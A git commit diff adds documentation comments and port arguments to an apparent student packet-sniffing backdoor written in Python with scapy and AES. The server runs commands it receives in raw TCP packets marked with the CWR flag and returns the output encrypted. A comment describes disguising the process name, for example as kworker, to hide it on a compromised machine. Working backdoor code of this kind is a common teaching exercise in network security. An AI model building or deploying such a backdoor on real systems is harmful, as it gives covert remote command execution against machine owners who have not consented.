dd0801dd4af7bb9c3bb84f37749085bc6bf39dbc
root <root@localhost.localdomain>
2015-10-17 15:04:44 -0700

    Added comments and fixed client

--- client.py
+++ client.py
@@ -1,20 +1,73 @@
-import socket
 import sys
 from scapy.all import *
 from Crypto.Cipher import AES
-from Crypto import Random
 
+######################################################################
+#	Function: usage()
+#
+#	Description:
+#	If user runs the program incorrectly, the function prints out the
+#	correct usage of this program then exits.
+#		
+#	Input:
+#	User must input a total of three arguments to run the program 
+#	correctly
+#
+#	Output:
+#	Program starts
+#	
+#	To run the program:
+#	python client.py [Server IP] [Server Port] [Client Port]
+#
+#	Example:
+#	python client.py 192.168.0.12 8505 8506
+######################################################################
 def usage():
     if len(sys.argv) != 3:
-        print "To use: ", sys.argv[0], "[Server IP] [Server Port]"
+        print "To use: ", sys.argv[0], "[Server IP] [Server Port] [Client Port]"
         sys.exit()
 
+######################################################################
+#	Function: stopfilter(pkt)
+#
+#	Parameter: pkt
+#
+#	Description:
+#	The function only checks if we get an ARP packet. If we do, do
+#	nothing, otherwise go back and run the rest of the code.
+#	
+#	Input:
+#	Packet is sent here for inspection whether if it is an ARP packet
+#	or not.
+#
+#	Output:
+#	Returns True if it is not an ARP packet and returns false if it is
+#	an ARP packet.
+######################################################################
 def stopfilter(pkt):
     if ARP in pkt:
         return False
     #if there is no arp in packet go on with the rest of the code
     return True
 
+######################################################################
+#	Function: encryptCommand(message)
+#
+#	Parameter: message
+#
+#	Description:
+#	When the function is called, a string must be included to be 
+#	encrypted. It is then passed to the variable message and 
+#	the function then encrypts the data using the AES algorithm
+#	with the secret key and salt provided and returns the 
+#	encrypted data back to whichever called the function.
+#	
+#	Input:
+#	Data to be encrypted
+#
+#	Output:
+#	Returns an ecnrypted data
+######################################################################
 def encryptCommand(message):
     #Secret key and Salt initialization
     secretKey = "Secret key lost."
@@ -25,6 +78,24 @@ def encryptCommand(message):
     encryptedData = crypt.encrypt(message)
     return encryptedData
 
+######################################################################
+#	Function: decryptCommand(message)
+#
+#	Parameter: message
+#
+#	Description:
+#	When the function is called, an encrypted data must included to be
+#	decrypted. The data is then passed to the variable message and the
+#	function then decrypts the data using the AES algorithm and the
+#	secret key and salt provided. The function then returns the 
+#	decrypted data back to whichever called this function.
+#	
+#	Input:
+#	Encrypted data to be decrypted
+#
+#	Output:
+#	Returns decrypted data
+######################################################################
 def decryptCommand(message):
     #Secret key and Salt initialization
     secretKey = "Secret key lost."
@@ -35,11 +106,36 @@ def decryptCommand(message):
     decryptedData = crypt.decrypt(message)
     return decryptedData
 
+######################################################################
+#	Function: sendCommand()
+#
+#	Description:
+#	The function takes in the command line arguments when the program
+#	first runs. We store the [Server IP] and [Server Port] into a 
+#	variable. We then check if we will be sending a command or 
+#	receiving an output from the server. If we are sending, we grab
+#	the string the user has inputted and add the authentication
+#	packet at the start and then encrypt the whole data. We then 
+#	send it to the server. After we send a packet to the server,
+#	we go into receiving mode and sniff for TCP packets with the 
+#	correct destination port. When we receive the packet we send it to
+#	the receiveOutput() function. After sending it to the receiveOutput
+#	function, we go back into sending mode and wait for user input for
+#	the next command
+#	
+#	Input:
+#	User input for encrypted command to be sent over to the server
+#
+#	Output:
+#	Sends an encrypted command to the server
+######################################################################
 def sendCommand():
     global destIP
     global authPacket
+    #command line arguments 
     destIP = sys.argv[1]
     destPort = sys.argv[2]
+    clientPort = sys.argv[3]
     #key to authenticating the packet
     authPacket = "Authenticate packets"
     sending = True
@@ -51,15 +147,39 @@ def sendCommand():
             #Encrypt the command with AES encryption
             encryptedCommand = encryptCommand(authPacket + command)
             #Create the packet and store the command in the data field
-            pkt = IP(src="192.168.0.10", dst=destIP)/TCP(dport=int(destPort), flags='C')/Raw(load=encryptedCommand)
+            pkt = IP(dst=destIP)/TCP(dport=int(destPort), flags='C')/Raw(load=encryptedCommand)
             #Send the packet
             send(pkt)
             sending = False
         else:
-            sniff(timeout=2, filter="tcp and host " + destIP + " and dst port 8506", prn=receiveOutput, stop_filter=stopfilter)
+            sniff(timeout=3, filter="tcp and host " + destIP + " and dst port " + clientPort, prn=receiveOutput, stop_filter=stopfilter)
             sending = True
 
-
+######################################################################
+#	Function: receiveOutput(pkt)
+#
+#	Parameter: pkt
+#
+#	Description:
+#	The function takes in the packets sniffed from the sendCommand()
+#	function. We first check if it's an ARP packet, and if it is, we
+#	do nothing. We then check for DHCP packet and do nothing if we 
+#	get it. If the source IP address is the same as the [Server IP]
+#	that the user specified, then we check for the flag of the packet.
+#	If the flag is "C", we then grab the data and decrypt it. If the
+#	data has the authentication string, we take out the authentication
+#	string and check whether we receive an "exit" command. If it is an 
+#	"exit" command, the program exits, otherwise print the output from
+#	the server.
+#	
+#	Input:
+#	Packet received from sniffing for TCP packets with the correct 
+#	destination IP address and destination port.
+#
+#	Output:
+#	If we receive exit command, we exit the program, otherwise
+#	print the output received from the server
+######################################################################
 def receiveOutput(pkt):
     global destIP
     global authPacket
--- server.py
+++ server.py
@@ -1,17 +1,53 @@
 import sys
-import socket
 import subprocess
 import setproctitle
-import time
 from scapy.all import *
 from Crypto.Cipher import AES
-from Crypto import Random
 
+
+######################################################################
+#	Function: usage()
+#
+#	Description:
+#	If user runs the program incorrectly, the function prints out the
+#	correct usage of this program then exits.
+#		
+#	Input:
+#	User must input a total of three arguments to run the program 
+#	correctly
+#
+#	Output:
+#	Program starts
+#	
+#	To run the program:
+#	python server.py [Server port] [Client Port]
+#
+#	Example:
+#	python server.py 8505 8506
+######################################################################
 def usage():
-    if len(sys.argv) != 2:
-        print "To use: ", sys.argv[0] + "[Server Port]"
+    if len(sys.argv) != 3:
+        print "To use: ", sys.argv[0] + "[Server Port] [Client Port]"
         sys.exit()
 
+######################################################################
+#	Function: encryptCommand(message)
+#
+#	Parameter: message
+#
+#	Description:
+#	When the function is called, a string must be included to be 
+#	encrypted. It is then passed to the variable message and 
+#	the function then encrypts the data using the AES algorithm
+#	with the secret key and salt provided and returns the 
+#	encrypted data back to whichever called the function.
+#	
+#	Input:
+#	Data to be encrypted
+#
+#	Output:
+#	Returns an ecnrypted data
+######################################################################
 def encryptCommand(message):
     #secret key and salt initialization
     secretKey = "Secret key lost."
@@ -22,6 +58,24 @@ def encryptCommand(message):
     encryptedData = crypt.encrypt(message)
     return encryptedData
 
+######################################################################
+#	Function: decryptCommand(message)
+#
+#	Parameter: message
+#
+#	Description:
+#	When the function is called, an encrypted data must included to be
+#	decrypted. The data is then passed to the variable message and the
+#	function then decrypts the data using the AES algorithm and the
+#	secret key and salt provided. The function then returns the 
+#	decrypted data back to whichever called this function.
+#	
+#	Input:
+#	Encrypted data to be decrypted
+#
+#	Output:
+#	Returns decrypted data
+######################################################################
 def decryptCommand(message):
     #secret key and salt initialization
     secretKey = "Secret key lost."
@@ -32,15 +86,44 @@ def decryptCommand(message):
     decryptedData = crypt.decrypt(message)
     return decryptedData
 
+######################################################################
+#	Function: server(pkt)
+#
+#	Parameter: pkt
+#
+#	Description:
+#	This function runs for every TCP packet with the destination port
+#	specified by the user. The function checks if the flag received is
+#	type "C" and if the destination port from the client is the same
+#	as the server port. If it is, then we grab the source IP address of
+#	the client form the packet received and decrypt the data. We check
+#	if the data starts with the authentication string or not. If the 
+#	data has the authentication string, we then take out the 
+#	authentication string and grab the rest of the data. We check if
+#	the remaining data contains "exit", which we send back the exit
+#	command to the client, otherwise we run the command in a subprocess.
+#	After running the command, we grab the output and encrypt the whole
+#	output as well as the authentication string and sends it back to 
+#	the client.
+#	
+#	Input:
+#	The packet received from sniffing TCP and the destination port
+#
+#	Output:
+#	Sending encrypted output to client
+######################################################################
 def server(pkt):
-    #Grab the source IP for each packets
+    #Grab the flag from the packet
     flagSet = pkt['TCP'].flags
+    #Grab the destination port from the packet
     dport = pkt[TCP].dport
     #key to authenticating the packet
     authPacket = "Authenticate packets"
-    #if src_ip == destIP:
+    #Checks for the flag if it is "C"
+    #Note that the "C" flag in long is 128
     if flagSet == long(128):
-        if dport == 8505:
+        if dport == destPort:
+        	#Grab the source IP for each packets
             src_ip = pkt[IP].src
             #Instantiate variables
             decryptedData=""
@@ -53,10 +136,10 @@ def server(pkt):
             if decryptedData.startswith(authPacket) == True:
                 #Take out the authentication part
                 newData = decryptedData[20:]
-                #If we get exit command, exit out of the system
+                #If we get exit command, send exit command back to client
                 if newData == "exit":
                     encryptExit = encryptCommand(authPacket + newData)
-                    pkt = IP(dst=str(src_ip))/TCP(dport=8506, flags='C')/Raw(load=encryptExit)
+                    pkt = IP(dst=str(src_ip))/TCP(dport=int(clientPort), flags='C')/Raw(load=encryptExit)
                     #Send the packet
                     send(pkt)
                     time.sleep(2)
@@ -68,19 +151,21 @@ def server(pkt):
                     #Encrypt the output and add the packet authenticator before sending back
                     encryptedReply = encryptCommand(authPacket + output)
                     #Create the output packet
-                    pkt = IP(dst=str(src_ip))/TCP(dport=8506, flags='C')/Raw(load=encryptedReply)
+                    pkt = IP(dst=str(src_ip))/TCP(dport=int(clientPort), flags='C')/Raw(load=encryptedReply)
                     #Send the packet
                     send(pkt)
             else:
                 return
 
 if __name__ == "__main__":
+	#Call usage first to make sure the user is using te program correctly
     usage()
     destPort = sys.argv[1]
+    clientPort = sys.argv[2]
     #Change process name so that we can hide this program on a compromised machine
     #Make it look like a legitimate process running in the background
     #Usually we want to use something like kworker/2:1 to mask the program
     title = "Backdoor Test"
     setproctitle.setproctitle(title)
-    #Sniff for packets from the host
+    #Sniff for TCP packets with destination port specified by the user
     sniff(filter="tcp and dst port " + destPort, prn=server)
